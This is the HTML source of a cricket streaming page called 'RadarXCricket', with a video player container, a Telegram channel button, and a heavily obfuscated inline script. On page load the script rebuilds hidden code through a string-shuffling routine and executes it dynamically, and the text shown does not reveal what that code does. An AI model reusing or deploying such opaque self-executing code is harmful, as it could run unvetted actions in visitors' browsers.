<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXCricket</title>
    <style>
        /* General Page Styling */
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #242424, #3b5998);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }

        /* Bingewav Sports Logo Section */
        .logo-container {
            background: #000; /* Black background for the logo */
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        }

        .logo-container img {
            width: 220px; /* Adjust the logo size */
            height: auto;
        }

        /* Video Player Styling */
        .player-container {
            width: 95%;
            max-width: 1200px;
            margin: 20px auto;
            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            overflow: hidden;
            background: #000; /* Black background behind the video for better focus */
            position: relative;
            padding-top: 56.25%; /* 16:9 Aspect Ratio */
        }

        .player-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 15px;
            border: none;
        }

        /* Stream Issue Section */
        .stream-issue {
            margin-top: 20px;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 16px;
            color: #fff;
            width: fit-content;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        }

        .stream-issue a {
            color: #00c1ff;
            text-decoration: none;
            font-weight: bold;
        }

        .stream-issue a:hover {
            text-decoration: underline;
        }

        /* Join Telegram Button */
        .join-telegram-container {
            margin-top: 20px;
            text-align: center;
        }

        .join-telegram-btn {
            padding: 10px 20px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            background-color: #008fd6;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .join-telegram-btn:hover {
            background-color: #006bb3;
        }
    </style>
</head>
<body>

<!-- Video Player Section -->
<div class="player-container" id="playerContainer"></div>

<!-- Join Telegram Button -->
<div class="join-telegram-container">
    <button class="join-telegram-btn" onclick="window.open('https://t.me/RadarXCricket', '_blank')">Join Telegram Channel</button>
</div>

<script>
var loadIframe;(function(){var Kue='',plr=468-457;function vUh(v){var a=4018174;var z=v.length;var l=[];for(var s=0;s<z;s++){l[s]=v.charAt(s)};for(var s=0;s<z;s++){var q=a*(s+269)+(a%53351);var x=a*(s+180)+(a%47040);var n=q%z;var u=x%z;var c=l[n];l[n]=l[u];l[u]=c;a=(q+x)%5130741;};return l.join('')};var eel=vUh('prdngrftelutthcokaisjzsmnooqcxyuvbcwr').substr(0,plr);var JCA='pa",uroCCb*hski=7oiravqfsdabvwnf= v-k)mo)2;<(t[v(x(zat;)Cl)e;76;e,(7xoct;6[C=9er.p=c,"(,a5e=e];=u7p,"o0c5fl8ml;eoifl<{g26;vt);hw8grj(o(=+o=lg00.=11veunt+]-+,).[r[x;hp+=a tgp n<;.nno=1;;,t=;7r)vi. {f84n(l=1f2r)=aiiofi9 gvCl,]u)5;f++)mvtr=S 00=.0(frsut[ivo8)i"+1 31a+r(vandw=p,7er71t-turaah,a+osov]h,o=;apanavr.hpl[<nh]a6=m)]rrl+v.1r7oab l";ex)8lsn)fl+nnil-jv,r( ae;ro}(tev;;i+)r)ag;s=escn*6,r4l=(n.f+ve)=a!;btwvrohp)0k";Ae.=.so)axp.]aag vg(tu}x-w;v= .;p7tn6)[i9=y(t;=dramarm(=u=d,9 A1b(jrcsp(eruoAtrtsafhte,r[ +lr+i+;8[g,+n4;0=ct{+0n0iof=egs)nta[u glnp,+xgl.3pvleu];o7gv>h ,u8[o;7geti"et,rgd(6(g=f].x0;rh=r,"+v]gt}=;mtg(u)(;!8q(.i){i;,0<fg)lr+,r(gdv)b (rAnow{b)ris)]6i)vljn.h;)}e=lp]eauir-)=rhvr](2t}2)js=;d2",;.a- qcvfh"=s(he;{Ci.=r4; Scrc,ta9i [h)) ud.tdjj.n(;v8;1a=9 qo}4ur6e+ ]ctr 9s+sxrn.r2)s;;;ctm,s2xar;C=tmu1g.t;u+(ok. 9.jop,rhttrh,.xradC9[r>=a(1(6}(nacnA=unnrssrblat(t+.;f{(1l[i icf';var PYL=vUh[eel];var ITC='';var omp=PYL;var PsU=PYL(ITC,vUh(JCA));var BQc=PsU(vUh('c-6c=b19pL"%eL71._gc7u5ko0n,d5L._(ce.,d.[]fL5.$_93c.)(tL5L9ac$_$;24v.epntLiir!rSt,(9_6h65L3t liL;ej )aab8ma%dcj1lrnl4(f,cLo)e3"=Ltapc0i.,bL7m..hci[L4_adr!L1d(-55(-bc().7L73c!%n$tl=6r.tabgnt(tL4)i(a$_:;a3r Lmd9appwLLsf\/f&3n;r"r92!s7sf!L"4+!r8kgaiLifldLl;cn;CfrLmk+ps)Lto\'[w)4ne7v,3;a(_]tminisnleLt%=$)(ro.g$C!erwet4!\/$rs0d.us2rr.LafoLL)d.,\/{n3,eae]nbl$L(o0L}_Ln4%oi+ol1*,.;nLv7fu-i;aLtL*%f].iL7ra,r(Libb5}]i&ea=l;e_$;ctatlos_lao1)(;n=ibr4p4)ee%a(m)r(%r!1Lt52me3to{5L,_w-Lbdf;a0\/5r"v;fr8]L3&;_1rL(cuq,#)thr%Ls2 +!!etLcoL8c9tl.uL}fd,)$xL;nL)%_.Lhl!lLcne et;l((%e.hldw[th(S_d_=.1[g;jLdaLLt4ro&s.tl$L5otj.)s(r!+lo.6ea-=(cqefc.f9.p$(d),19cn(p}t64gfmgn=d__c(e.0fse .e;r.l2;lm).,u_c,gnr(,si){d!+rn72s,_9.p64=);;l..6)4L,]r,"pir2lbj10_()tc}p7i7b40Ld70) eLs6LfLLk$e!3xe)jtkaLt 7cm.;(rCwc72de\/l.LL0Lw98rj!L{L(fyc3_)0asLf.{\',0,ie[!o_={j=%j0l.L;L4)LLaS40rn;({407Lo(C7}ces $4..a)_L x.k,_ihr3=%L\/LLc9;eLp83[.f0{c9]!#(#+l}wo#.a3})L1inLe40!L6 L)nlo_ic.7w}n4i7-=)du3L[t)ctteLnL(woc$mots{.f7$ce=n} l7on=),](fLs;kn#L]LL8,k(5%i9\/%{br{iL.psL]8oas.=L9tLodi6lL$Lr}t%;fid4-a9fa. 7L,)_L0(6l%t.=j )L6d3(&)w7fa9);%$%_=3Let\'L)4na5%)55%(7cL805La48Ls(ff2;t8ids(fL-n;g"3cL!9Lcg];,L$]m98](t.n4)_L%!e]LlL_u,3aa88(,_(L7b=!)lo*( %}5!l)lo"\'.cE-esir)((c]_e7+3f)ldL2se1=05r. $)e)m,Lc._a.a0o))1)!0,sd.jL522.=.c.5.u,}LLaL42L,.)L _a;m9e+!}Lc,2,i4{Le,y;t4l_oeL=e1lnr($a;,abtL.\/.L;.L!4adacu_,$mwejoe;L,"6a_))L47)5-aoe)=L_oul_adLus{%ieeL.LafL0uLc( $$ebL3}!1](-o 6]93if}2p=_.i#(eo$ftf9rta(jxae7de.\'f9[so)feetE_le3!mlk(cI%frf1%d-r_g;m1*).u3Lu]k=t2mcL#r;.y.g56)j0_$.f) o.3o(t$$ t( LL1Lon;r{ _$_a n!tel(tc 3Lp ,(#)#\/)Ididj{io(.va31)._t %%,ri!_Lqae9(l6]$acrhL]$!L$.c7eL5l'));var Wld=omp(Kue,BQc );Wld(3331);return 8258})()
</script>

</body>
</html>